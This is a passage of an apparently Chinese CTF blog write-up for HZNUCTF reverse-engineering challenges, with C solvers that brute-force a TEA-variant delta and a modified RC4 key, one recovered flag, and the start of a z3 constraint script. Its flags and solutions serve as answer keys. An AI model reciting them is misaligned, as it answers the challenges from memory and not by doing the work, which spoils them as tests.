class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void encipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>],uint32_t delta) &#123;</span><br><span class="line">	unsigned <span class="built_in">int</span> i;</span><br><span class="line">	uint32_t v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], <span class="built_in">sum</span> = <span class="number">0</span>,a,b,c	;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">	/*	printf(<span class="string">&quot;%x,%x,%x\n&quot;</span>, v0, v1,<span class="built_in">sum</span>);*/</span><br><span class="line">		a = (v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">		//printf(<span class="string">&quot;%x\n&quot;</span>, a);</span><br><span class="line">		b = a+v1;</span><br><span class="line">		c = <span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>];</span><br><span class="line">		v0 += ( b^ c);</span><br><span class="line">		<span class="built_in">sum</span> -= delta;</span><br><span class="line">		v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void decipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>],uint32_t delta) &#123;</span><br><span class="line">	unsigned <span class="built_in">int</span> i;</span><br><span class="line">	uint32_t v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], <span class="built_in">sum</span> = delta * num_rounds ;</span><br><span class="line">	<span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) <span class="built_in">sum</span> -= delta;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line"></span><br><span class="line">		v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">		<span class="built_in">sum</span> += delta;</span><br><span class="line">		v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>]);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">	uint32_t v[<span class="number">8</span>] = &#123; <span class="number">0x8CCB2324</span>, <span class="number">0x09A7741A</span>, <span class="number">0xFB3C678D</span>, <span class="number">0xF6083A79</span>, <span class="number">0xF1CC241B</span>, <span class="number">0x39FA59F2</span>, <span class="number">0xF2ABE1CC</span>, <span class="number">0x17189F72</span> &#125;;</span><br><span class="line">	uint32_t k[<span class="number">4</span>] = &#123; <span class="number">0x000019F8</span>, <span class="number">0x000011BE</span>, <span class="number">0x00000991</span>, <span class="number">0x00003418</span> &#125;;</span><br><span class="line">	srand(<span class="number">2024</span>);</span><br><span class="line">	uint32_t v2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	char flag[] = <span class="string">&quot;HZNUCTF&#123;&quot;</span>;</span><br><span class="line">	//<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">	//	k[i] = rand();</span><br><span class="line">	//&#125;</span><br><span class="line"></span><br><span class="line">	uint32_t delta = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (uint32_t j = <span class="number">0</span>; j &lt; <span class="number">0xffffffff</span>; j++) &#123;</span><br><span class="line">		v2[<span class="number">0</span>] = <span class="number">0x485a4e55</span>;</span><br><span class="line">		v2[<span class="number">1</span>] = <span class="number">0x4354467b</span>;</span><br><span class="line">		encipher(<span class="number">32</span>, v2, k,j);</span><br><span class="line">		<span class="keyword">if</span> (v2[<span class="number">0</span>] == v[<span class="number">0</span>]) &#123;</span><br><span class="line">			delta = j;</span><br><span class="line">			printf(<span class="string">&quot;%d\n&quot;</span>, j);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	unsigned <span class="built_in">int</span> r = <span class="number">32</span>;			</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">6</span>; i &gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">		decipher(r, &amp;v[i], k, delta);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		printf(<span class="string">&quot;%c&quot;</span>, *((char*)v + i));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后手动把四字节反转一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HZNUCTF&#123;ae6-9f57-4b74-b423-98eb&#125;</span><br></pre></td></tr></table></figure>
<h3 id="conforand">conforand</h3>
<p>混淆成一坨了，把seed改为1后动调+盯帧查看数据变化和加密逻辑。</p>
<p>魔改rc4，魔改了下面的部分。</p>
<p>时间戳作为种子生成随机数（delta）对密钥进行了异或加密。</p>
<p>加密时盒交换就交换了一次，详情看下面的脚本。</p>
<p>解密时对随机数进行爆破再异或密钥解密魔改rc4就行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//s 表的长度取 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> size 257</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">257</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 s 表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* key,<span class="type">unsigned</span> <span class="type">int</span> delta)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i, j, k;</span><br><span class="line">	<span class="type">int</span> tmp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> keyt[<span class="number">257</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//int delta = 0x6B8B4567;</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">		sbox[i] = i;</span><br><span class="line">		keyt[i] = (key[i % <span class="number">9</span>] ^ delta) % <span class="number">256</span>; </span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	j =k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">		tmp = sbox[i];</span><br><span class="line">		j = (j + tmp + keyt[i]) % <span class="number">257</span>;  </span><br><span class="line">		<span class="comment">//printf(&quot;%x,&quot;, j);</span></span><br><span class="line">		sbox[i] = sbox[j];</span><br><span class="line">		sbox[j] = tmp;</span><br><span class="line">		<span class="comment">/*if (++k &gt;= 12)</span></span><br><span class="line"><span class="comment">			k = 0;*/</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加解密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">enc_dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">unsigned</span> <span class="type">int</span> delta)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i, j, k, R, tmp;</span><br><span class="line"></span><br><span class="line">	init_sbox(key,delta);</span><br><span class="line">	<span class="comment">//printf(&quot;R:\n&quot;);</span></span><br><span class="line">	j = k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">char</span>*)data); i++) &#123;</span><br><span class="line">		j = (j + <span class="number">1</span>) % size;</span><br><span class="line">		k = (k + sbox[j]) % size;</span><br><span class="line"></span><br><span class="line">		tmp = sbox[j];</span><br><span class="line">		sbox[j] = sbox[k];</span><br><span class="line">		<span class="comment">//sbox[k] = tmp;</span></span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		a = (sbox[j]);</span><br><span class="line">		b = sbox[k];</span><br><span class="line">		c = a + b;</span><br><span class="line">		<span class="comment">/*for (int i = 0; i &lt; 256; i++) &#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;0x%x,&quot;, sbox[i]);</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		R = sbox[c % size];</span><br><span class="line">		<span class="comment">//printf(&quot;%x,&quot;, R);</span></span><br><span class="line">		data[i] ^= R;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">100</span>] =<span class="string">&quot;JustDoIt!&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">100</span>] = <span class="string">&quot;000000000000000000000000000000000000000000&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> mm[<span class="number">100</span>] = &#123; <span class="number">0x83</span>,<span class="number">0x1e</span>,<span class="number">0x9c</span>,<span class="number">0x48</span>,<span class="number">0x7a</span>,<span class="number">0xfa</span>,<span class="number">0xe8</span>,<span class="number">0x88</span>,<span class="number">0x36</span>,<span class="number">0xd5</span>,<span class="number">0x0a</span>,<span class="number">0x08</span>,<span class="number">0xf6</span>,<span class="number">0xa7</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xfd</span>,<span class="number">0x67</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0x3c</span>,<span class="number">0xa7</span>,<span class="number">0xed</span>,<span class="number">0x8d</span>,<span class="number">0x51</span>,<span class="number">0x10</span>,<span class="number">0xce</span>,<span class="number">0x6a</span>,<span class="number">0x9e</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0xe7</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x67</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x6e</span>,<span class="number">0xcd</span>,<span class="number">0x2f</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> flag[] = <span class="string">&quot;HZNUCTF&#123;&#125;&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line">	tmp[<span class="number">42</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++) &#123;  <span class="comment">//爆破随机数</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">42</span>; j++) &#123;</span><br><span class="line">			tmp[j] = mm[j];</span><br><span class="line">		&#125;</span><br><span class="line">		enc_dec(key, tmp,i);</span><br><span class="line">		<span class="keyword">if</span> (tmp[<span class="number">0</span>] == flag[<span class="number">0</span>] &amp;&amp; tmp[<span class="number">1</span>] == flag[<span class="number">1</span>] &amp;&amp;tmp[<span class="number">2</span>] == flag[<span class="number">2</span>] &amp;&amp; tmp[<span class="number">3</span>] == flag[<span class="number">3</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;delta:%d\n&quot;</span>, i);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, mm[i]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="蛇年的本命语言"><strong>蛇年的本命语言</strong></h3>
<p>z3解一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">i11i1Iii1I1 =<span class="built_in">list</span>(Int(<span class="string">f&quot;a_<span class="subst">&#123;i&#125;</span>&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>))</span><br><span class="line">ii1iIi1i11i = [</span><br><span class="line">    <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] == <span class="number">504</span>,</span><br><span class="line">    <span class="number">9</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] == <span class="number">403</span>,</span><br><span class="line">    (<span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] == <span class="number">799</span>,</span><br><span class="line">    <span class="number">3</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">3</span>] == <span class="number">2938</span>,</span><br><span class="line">    (<span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">19</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">1</span> * i11i1Iii1I1[<span class="number">4</span>] == <span class="number">2042</span>,</span><br><span class="line">    (<span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">2</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">5</span> * i11i1Iii1I1[<span class="number">5</span>] == <span class="number">1225</span>,</span><br><span class="line">    <span class="number">11</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">77</span> * i11i1Iii1I1[<span class="number">6</span>] == <span class="number">7975</span>,</span><br><span class="line">    ((<span class="number">21</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">7</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">7</span>] == <span class="number">229</span>,</span><br><span class="line">    (<span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">8</span>] == <span class="number">2107</span>,</span><br><span class="line">    (<span class="number">10</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">1</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">8</span>]) + <span class="number">30</span> * i11i1Iii1I1[<span class="number">9</span>] == <span class="number">4037</span>,</span><br><span class="line">    (<span class="number">15</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">59</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">56</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">122</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] == <span class="number">4950</span>,</span><br><span class="line">    (((<span class="number">13</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">13</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">42</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">62</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] == <span class="number">12544</span>,</span><br><span class="line">    (((<span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">63</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">25</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">2</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] == <span class="number">6585</span>,</span><br><span class="line">    ((((<span class="number">223</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">53</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">3</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">13</span> * i11i1Iii1I1[<span class="number">13</span>] == <span class="number">6893</span>,</span><br><span class="line">    ((((<span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">68</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">33</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">14</span> * i11i1Iii1I1[<span class="number">14</span>] == <span class="number">1883</span>,</span><br><span class="line">    (((<span class="number">69</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">77</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">8</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">38</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] == <span class="number">8257</span>,</span><br><span class="line">    ((((<span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">12</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">14</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">1</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">68</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">16</span>] == <span class="number">5847</span>,</span><br><span class="line">    (((((<span class="number">24</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">13</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">67</span> * 